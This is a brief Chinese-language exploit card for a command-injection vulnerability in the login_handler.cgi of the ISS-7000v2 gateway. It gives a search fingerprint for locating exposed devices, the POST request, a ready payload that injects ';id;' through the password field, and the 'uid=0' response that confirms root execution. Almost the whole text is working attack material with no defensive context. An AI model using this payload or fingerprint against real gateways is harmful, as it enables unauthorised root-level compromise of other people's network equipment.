# ISS-7000v2网关login_handler.cgi存在命令执行漏洞

ISS ｜ 命令执行 ｜ —
- **指纹**：`body="css/login_form_style-06.css"`
- **请求**：`POST /login_handler.cgi HTTP/1.1`

**Payload**
```
username=admin&password=admin;id;&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
```
- **响应特征**：200 uid=0